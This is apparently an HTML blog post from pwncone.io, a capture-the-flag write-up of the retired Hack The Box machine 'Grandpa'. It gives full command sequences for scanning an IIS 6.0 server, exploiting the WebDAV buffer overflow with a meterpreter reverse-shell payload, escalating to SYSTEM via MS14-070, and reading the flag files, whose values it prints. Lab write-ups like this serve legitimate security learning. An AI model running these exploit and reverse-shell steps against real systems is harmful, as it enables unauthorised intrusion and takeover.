@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Grandpa</strong></h1>
+        <em>Released: 12th April 2017 / Pwned: September 2nd 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        The name of this box implies that it's probably outdated, which is correct. You exploit an IIS 6.0 server using a WebDAV Remote Buffer Overflow to gain a shell on the system, and then elevate privileges to NT AUTHORITY\SYSTEM using another CVE. Personally, I'm not a fan of boxes like this. It's just trial and error with each of exploits until you hit the right one.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.14</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/grandpa#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/grandpa#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.14<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;6.0<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE&nbsp;COPY&nbsp;PROPFIND&nbsp;SEARCH&nbsp;LOCK&nbsp;UNLOCK&nbsp;DELETE&nbsp;PUT&nbsp;MOVE&nbsp;MKCOL&nbsp;PROPPATCH<br>
+                |_http-server-header:&nbsp;Microsoft-IIS/6.0<br>
+                |_http-title:&nbsp;Under&nbsp;Construction<br>
+                |&nbsp;http-webdav-scan:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;Server&nbsp;Date:&nbsp;Sat,&nbsp;31&nbsp;Aug&nbsp;2019&nbsp;09:29:43&nbsp;GMT<br>
+                |&nbsp;&nbsp;&nbsp;Public&nbsp;Options:&nbsp;OPTIONS,&nbsp;TRACE,&nbsp;GET,&nbsp;HEAD,&nbsp;DELETE,&nbsp;PUT,&nbsp;POST,&nbsp;COPY,&nbsp;MOVE,&nbsp;MKCOL,&nbsp;PROPFIND,&nbsp;PROPPATCH,&nbsp;LOCK,&nbsp;UNLOCK,&nbsp;SEARCH<br>
+                |&nbsp;&nbsp;&nbsp;Server&nbsp;Type:&nbsp;Microsoft-IIS/6.0<br>
+                |&nbsp;&nbsp;&nbsp;WebDAV&nbsp;type:&nbsp;Unkown<br>
+                |_&nbsp;&nbsp;Allowed&nbsp;Methods:&nbsp;OPTIONS,&nbsp;TRACE,&nbsp;GET,&nbsp;HEAD,&nbsp;COPY,&nbsp;PROPFIND,&nbsp;SEARCH,&nbsp;LOCK,&nbsp;UNLOCK<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose<br>
+                Running&nbsp;(JUST&nbsp;GUESSING):&nbsp;Microsoft&nbsp;Windows&nbsp;2003|2008|XP|2000&nbsp;(92%)<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows_server_2003::sp1&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 80/http - An IIS 6.0 web server is running WebDAV. IIS 6.0 is old, so there's most likely an exploit available for it.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) searchsploit IIS 6.0</strong></h2><br>
+        <code>searchsploit</code> for an exploit for IIS 6.0.<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/grandpa/exploits#&nbsp;searchsploit&nbsp;iis&nbsp;6.0<br>
+                --------------------------------------------------------------------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                -------------------------------------------------------------------------------------------------&nbsp;<br>
+                Microsoft&nbsp;IIS&nbsp;4.0/5.0/6.0&nbsp;-&nbsp;Internal&nbsp;IP&nbsp;Address/Internal&nbsp;Network&nbsp;Name&nbsp;Disclosure&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/21057.txt<br>
+                Microsoft&nbsp;IIS&nbsp;5.0/6.0&nbsp;FTP&nbsp;Server&nbsp;(Windows&nbsp;2000)&nbsp;-&nbsp;Remote&nbsp;Stack&nbsp;Overflow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/9541.pl<br>
+                Microsoft&nbsp;IIS&nbsp;5.0/6.0&nbsp;FTP&nbsp;Server&nbsp;-&nbsp;Stack&nbsp;Exhaustion&nbsp;Denial&nbsp;of&nbsp;Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/dos/9587.txt<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;'/AUX&nbsp;/&nbsp;'.aspx'&nbsp;Remote&nbsp;Denial&nbsp;of&nbsp;Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/dos/3965.pl<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;ASP&nbsp;Stack&nbsp;Overflow&nbsp;Stack&nbsp;Exhaustion&nbsp;(Denial&nbsp;of&nbsp;Service)&nbsp;(MS10-065)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/dos/15167.txt<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;'ScStoragePathFromUrl'&nbsp;Remote&nbsp;Buffer&nbsp;Overflow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/41738.py<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;Remote&nbsp;Authentication&nbsp;Bypass&nbsp;(1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/8704.txt<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;Remote&nbsp;Authentication&nbsp;Bypass&nbsp;(2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/8806.pl<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;Remote&nbsp;Authentication&nbsp;Bypass&nbsp;(PHP)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/8765.php<br>
+                Microsoft&nbsp;IIS&nbsp;6.0&nbsp;-&nbsp;WebDAV&nbsp;Remote&nbsp;Authentication&nbsp;Bypass&nbsp;(Patch)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/8754.patch<br>
+                Microsoft&nbsp;IIS&nbsp;6.0/7.5&nbsp;(+&nbsp;PHP)&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/windows/remote/19033.txt<br>
+                --------------------------------------------------------------------------------------------------<br>
+                Shellcodes:&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        And we find a <code>WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow</code> exploit that can be used to spawn a reverse shell on the target system.<br>
+        <br>
+        There's a metasploit module available for this exploit that will get a you a shell on the system.<br>
+        I was trying to avoid using metasploit, but using a meterpreter shell was the only way I could get this exploit to work.<br>
+        <br>
+        <code>danigargu</code>'s script for this exploit works great - <a href="https://github.com/danigargu/explodingcan">https://github.com/danigargu/explodingcan</a> - but I could only get a successfull shell when using a meterpreter payload. So despite using an exploit outside of metasploit, I was forced back in it once again if I wanted a functioning shell.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) explodingcan.py</strong></h2><br>
+        <code>wget</code> danigargu's exploit.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/grandpa#&nbsp;mkdir&nbsp;exploits<br>
+                root@gotham:~/ctf/grandpa#&nbsp;cd&nbsp;exploits<br>
+                root@gotham:~/ctf/grandpa/exploits#&nbsp;wget&nbsp;https://raw.githubusercontent.com/danigargu/explodingcan/master/explodingcan.py<br>
+                ..
+            </div>
+        </div><br>
+        <br>
+        Generate the shellcode for the exploit using the example that the exploit author provides.<br>
+        Specifying <code>--platform Windows</code> will cause a unicode error, and using a <code>windows/shell/reverse_tcp</code> payload or similar will get a connection back from the target but no shell.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/grandpa/exploits#&nbsp;msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;-f&nbsp;raw&nbsp;-v&nbsp;sc&nbsp;-e&nbsp;x86/alpha_mixed&nbsp;LHOST=10.10.14.3&nbsp;LPORT=9001&nbsp;&gt;&nbsp;shellcode.txt<br>
+                [-]&nbsp;No&nbsp;platform&nbsp;was&nbsp;selected,&nbsp;choosing&nbsp;Msf::Module::Platform::Windows&nbsp;from&nbsp;the&nbsp;payload<br>
+                [-]&nbsp;No&nbsp;arch&nbsp;selected,&nbsp;selecting&nbsp;arch:&nbsp;x86&nbsp;from&nbsp;the&nbsp;payload<br>
+                Found&nbsp;1&nbsp;compatible&nbsp;encoders<br>
+                Attempting&nbsp;to&nbsp;encode&nbsp;payload&nbsp;with&nbsp;1&nbsp;iterations&nbsp;of&nbsp;x86/alpha_mixed<br>
+                x86/alpha_mixed&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;744&nbsp;(iteration=0)<br>
+                x86/alpha_mixed&nbsp;chosen&nbsp;with&nbsp;final&nbsp;size&nbsp;744<br>
+                Payload&nbsp;size:&nbsp;744&nbsp;bytes
+            </div>
+        </div><br>
+        <br>
+        Start metasploit and set up a meterpreter listener to receive the reverse shell.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/grandpa#&nbsp;msfconsole<br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/handler<br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;payload&nbsp;windows/meterpreter/reverse_tcp<br>
+                payload&nbsp;=&gt;&nbsp;windows/meterpreter/reverse_tcp<br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;10.10.14.3<br>
+                LHOST&nbsp;=&gt;&nbsp;10.10.14.3<br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;9001<br>
+                LPORT&nbsp;=&gt;&nbsp;9001<br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.3:9001&nbsp;
+            </div>
+        </div><br>
+        <br>
+        And run the exploit.<br>
+        You should have a meterpreter session open on your listener.<br>
+            <div class="codebox">
+                ...<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;(179779&nbsp;bytes)&nbsp;to&nbsp;10.10.10.14<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(10.10.14.3:9001&nbsp;-&gt;&nbsp;10.10.10.14:1037)&nbsp;at&nbsp;2019-09-02&nbsp;11:43:29&nbsp;+0100<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;sysinfo<br>
+                Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;GRANPA<br>
+                OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Windows&nbsp;.NET&nbsp;Server&nbsp;(Build&nbsp;3790,&nbsp;Service&nbsp;Pack&nbsp;2).<br>
+                Architecture&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86<br>
+                System&nbsp;Language&nbsp;:&nbsp;en_US<br>
+                Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;HTB<br>
+                Logged&nbsp;On&nbsp;Users&nbsp;:&nbsp;2<br>
+                Meterpreter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86/windows
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) local_exploit_suggester</strong></h2><br>
+        If you have a meterpreter shell, you may as well make use of what it provides.<br>
+        <br>
+        Load the <code>local_exploit_suggester</code> module and enumerate for potential exploits against the system.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;bg<br>
+                [*]&nbsp;Backgrounding&nbsp;session&nbsp;1...<br>
+                <br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;use&nbsp;post/multi/recon/local_exploit_suggester<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;1<br>
+                SESSION&nbsp;=&gt;&nbsp;1<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;10.10.10.14&nbsp;-&nbsp;Collecting&nbsp;local&nbsp;exploits&nbsp;for&nbsp;x86/windows...<br>
+                [*]&nbsp;10.10.10.14&nbsp;-&nbsp;29&nbsp;exploit&nbsp;checks&nbsp;are&nbsp;being&nbsp;tried...<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ms10_015_kitrap0d:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ms14_058_track_popup_menu:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ms14_070_tcpip_ioctl:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ms15_051_client_copy_image:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ms16_016_webdav:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ms16_032_secondary_logon_handle_privesc:&nbsp;The&nbsp;target&nbsp;service&nbsp;is&nbsp;running,&nbsp;but&nbsp;could&nbsp;not&nbsp;be&nbsp;validated.<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ms16_075_reflection:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ms16_075_reflection_juicy:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [+]&nbsp;10.10.10.14&nbsp;-&nbsp;exploit/windows/local/ppr_flatten_rec:&nbsp;The&nbsp;target&nbsp;appears&nbsp;to&nbsp;be&nbsp;vulnerable.<br>
+                [*]&nbsp;Post&nbsp;module&nbsp;execution&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        This part is what I regard as <em>exploit soup</em>. I hate it.<br>
+        Go through each the exploits 1 by 1, in the order of most-likely to least likely to work based on exploit/system info/architecture etc, and test if they work.<br>
+        <br>
+        Eventually, you'll find that <code>ms14_070_tcpip_ioctl</code> will get you a system shell.<br>
+        <code>ms14_070</code> elevates privileges within the exisiting shell, which is why the exploit is successful but no session gets created.<br>
+            <div class="codebox">
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/local/ms14_070_tcpip_ioctl<br>
+                msf5&nbsp;exploit(windows/local/ms14_070_tcpip_ioctl)&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;1<br>
+                SESSION&nbsp;=&gt;&nbsp;1<br>
+                msf5&nbsp;exploit(windows/local/ms14_070_tcpip_ioctl)&nbsp;&gt;&nbsp;exploit<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;192.168.1.86:4444&nbsp;<br>
+                [*]&nbsp;Storing&nbsp;the&nbsp;shellcode&nbsp;in&nbsp;memory...<br>
+                [*]&nbsp;Triggering&nbsp;the&nbsp;vulnerability...<br>
+                [*]&nbsp;Checking&nbsp;privileges&nbsp;after&nbsp;exploitation...<br>
+                [+]&nbsp;Exploitation&nbsp;successful!<br>
+                [*]&nbsp;Exploit&nbsp;completed,&nbsp;but&nbsp;no&nbsp;session&nbsp;was&nbsp;created.<br>
+                <br>
+                msf5&nbsp;exploit(windows/local/ms14_070_tcpip_ioctl)&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;1<br>
+                [*]&nbsp;Starting&nbsp;interaction&nbsp;with&nbsp;1...<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;getuid<br>
+                Server&nbsp;username:&nbsp;NT&nbsp;AUTHORITY\SYSTEM
+            </div>
+        </div><br>
+        <br>
+        Drop into a <code>shell</code> and grab <code>user.txt</code> and <code>root.txt</code>.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;shell<br>
+                Process&nbsp;2344&nbsp;created.<br>
+                Channel&nbsp;5&nbsp;created.<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;5.2.3790]<br>
+                (C)&nbsp;Copyright&nbsp;1985-2003&nbsp;Microsoft&nbsp;Corp.<br>
+                <br>
+                c:\windows\system32\inetsrv&gt;type&nbsp;"C:\Documents&nbsp;and&nbsp;Settings\Harry\Desktop\user.txt"<br>
+                type&nbsp;"C:\Documents&nbsp;and&nbsp;Settings\Harry\Desktop\user.txt"<br>
+                bdff5ec67c3cff017f2bedc146a5d869<br>
+                c:\windows\system32\inetsrv&gt;type&nbsp;"C:\Documents&nbsp;and&nbsp;Settings\Administrator\Desktop\root.txt"<br>
+                type&nbsp;"C:\Documents&nbsp;and&nbsp;Settings\Administrator\Desktop\root.txt"<br>
+                9359e905a2c35f861f6a57cecf28bb7b
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
